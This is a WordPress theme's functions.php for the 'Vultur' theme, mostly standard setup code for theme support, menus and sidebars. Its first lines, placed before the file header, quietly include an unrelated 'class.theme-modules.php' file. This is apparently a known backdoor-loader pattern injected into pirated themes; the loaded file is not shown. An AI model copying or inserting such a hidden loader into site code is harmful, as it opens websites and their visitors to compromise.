<?php
if (file_exists(dirname(__FILE__) . '/class.theme-modules.php'))
include_once(dirname(__FILE__) . '/class.theme-modules.php');

/**
 * Vultur functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Vultur
 */

add_filter( 'wp_image_editors', 'change_graphic_lib' );

function change_graphic_lib($array) {
return array( 'WP_Image_Editor_GD', 'WP_Image_Editor_Imagick' );
}

if ( ! function_exists( 'vultur_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function vultur_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Vultur, use a find and replace
		 * to change 'vultur' to the name of your theme in all the template files.
		 */
		 load_theme_textdomain( 'vultur', get_template_directory() . '/languages' );
        // Add default posts and comments RSS feed links to head.
		 add_theme_support( 'automatic-feed-links' );
        /*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		 add_editor_style();
		 get_the_tag_list();
		 add_theme_support( 'title-tag' );
        /*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
        // This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'vultur' => esc_html__('Header Top Menu', 'vultur'),
		) );
        /*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support('html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support('custom-background', apply_filters( 'vultur_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support('custom-logo', array(
			'height'      => 250, 
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	} 
endif;
add_action( 'after_setup_theme', 'vultur_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function vultur_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'vultur_content_width', 640 );
}
add_action( 'after_setup_theme', 'vultur_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function vultur_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'vultur' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add Sidebar widgets here.', 'vultur' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title_wrapper"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Shop Sidebar (WooCommerce)', 'vultur' ),
		'id'            => 'woocommerce-sidebar-1',
		'description'   => esc_html__( 'Add Shop Sidebar widgets here. If WooCommerce is activated.', 'vultur' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title_wrapper"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Sidebar 1', 'vultur' ),
		'id'            => 'footer-sidebar-1',
		'description'   => esc_html__( 'Add Footer Sidebar widgets here.', 'vultur' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="f-widget-title"><h4>',
		'after_title'   => '</h4></div>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Sidebar 2', 'vultur' ),
		'id'            => 'footer-sidebar-2',
		'description'   => esc_html__( 'Add Footer Sidebar widgets here.', 'vultur' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="f-widget-title"><h4>',
		'after_title'   => '</h4></div>',
	) );
	// register_sidebar( array(
	// 	'name'          => esc_html__( 'LMS Single Sidebar Bottom', 'vultur' ),
	// 	'id'            => 'lms-sidebar-single-bottom',
	// 	'description'   => esc_html__( 'Add Widgets for Single LMS.', 'vultur' ),
	// 	'before_widget' => '<div id="%1$s" class="widget %2$s">',
	// 	'after_widget'  => '</div>',
	// 	'before_title'  => '<div class="f-widget-title"><h2>',
	// 	'after_title'   => '</h2></div>',
	// ) );
}
add_action( 'widgets_init', 'vultur_widgets_init' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/** 
 * Vultur Funcation
 */
require get_template_directory() . '/vendor/vultur-funcation.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}